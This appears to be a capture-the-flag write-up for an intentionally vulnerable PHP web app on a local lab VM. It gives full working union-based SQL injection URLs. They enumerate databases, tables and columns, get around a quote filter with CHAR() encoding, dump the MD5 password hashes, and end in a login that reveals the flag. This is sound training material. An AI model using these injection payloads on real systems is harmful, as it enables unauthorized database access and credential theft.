# http://192.168.99.100/index.php?page=signin

to get this flag we're going to
- list all databases on the sql server 
- list tables in a database
- list columns in a table

first, let's go to a page that allows us to do sql injection:

either `http://192.168.99.100/?page=member` or `http://192.168.99.100/index.php?page=searchimg`

normally, in sql, to get a list of all databases you would do:

```sql
show databases;
```

however, because we're doing sql injection, we must use `union` and get the database names via `select`

we can get the database names from `information_schema.schemata`

to see all available columns in schemata we can do `select * from information_schema.schemata`

we are most interested in `schema_name`

#
let's try this url:
_**`http://192.168.99.100/index.php?page=member&id=-1 union select schema_name, 0 from information_schema.schemata&Submit=Submit`**_

after a little parsing, we have all database names:
-   `information_schema`
-   `Member_Brute_Force`
-   `Member_Sql_Injection`
-   `Member_guestbook`
-   `Member_images`
-   `Member_survey`

#

we are interested in the `Member_Brute_Force` database, how do we get a list of tables?

normally, in **sql** it would be something like this:

```sql
    use Member_Brute_Force;
    show tables;
```

but again, since we're using `union` and `select` we have to change that,

we can get the information we need from `information_schema.tables`

to see all available columns you could do `select * from information_schema.tables`

in our case, we're only interested in table names so we could do `select table_name from information_schema.tables`

and to narrow it down to a specific database we could do `select table_name from information_schema.tables where table_schema='Member_Brute_Force'`

however the php page will throw an error if we try to use quotes in our query, so we need a workaround ..


**`CHAR()` and `python` to the rescue ...**
```sh
e1z2r10p4% python -c 'print([ord(c) for c in "Member_Brute_Force"]);'       
[77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101]
```

so instead of using quotes

`where table_schema='Member_Brute_Force'`

we're going to use 

`where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)`

this is just a way of representing the database name without using quotes

let's try this url: _**`http://192.168.99.100/index.php?page=member&id=-1 union select table_name,0 from information_schema.tables where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)&Submit=Submit`**_

and now we know the name of the table in that database: `db_default`

let's get a list of column names:
url: _**`http://192.168.99.100/index.php?page=member&id=-1 union select column_name,0 from information_schema.columns where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)&Submit=Submit`**_

if the database had more than one table you would probably also want to specify the table name like so:

`select column_name from information_schema.columns where table_schema=CHAR(...) and table_name=CHAR(...)`

so now, we know the column names in `Member_Brute_Force.db_default`:
-   *id*
-   *username*
-   *password*

to list all usernames and passwords lets do:
_**`http://192.168.99.100/index.php?page=member&id=-1 union select username, password from Member_Brute_Force.db_default&Submit=Submit`**_


how nice, we don't have to use `CHAR()` here

and this is what we get

username|password
-|-
root|3bf1114a986ba87ed28fc1b5884fc2f8
admin|3bf1114a986ba87ed28fc1b5884fc2f8


both have the same password, haha

a quick google search reveals that the password is an **MD5** hash of the string **_shadow_**


let's see a page diff:

```sh
e1z2r10p4% curl -s 'http://192.168.99.100/index.php?page=signin&username=dummy&password=dummy&Login=Login' -o before.html
e1z2r10p4% curl -s 'http://192.168.99.100/index.php?page=signin&username=admin&password=shadow&Login=Login' -o after.html 
e1z2r10p4% diff before.html after.html 
37c37
< <center><h2 style="margin-top:50px;"></h2><br/><img src="images/WrongAnswer.gif" alt=""></center>				</div>
---
> <center><h2 style="margin-top:50px;">The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 </h2><br/><img src="images/win.png" alt="" width=200px height=200px></center>				</div>
e1z2r10p4% 
```


##### we have the flag `b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2`
tada!


another approach to getting this flag would be to actually try and (like the database name suggests) brute force this page via consecutive `GET` requests using a wordlist or dictionary, but it seems that the page calls the `sleep()` function when the user provides the wrong password, this makes the brute force approach less appealing
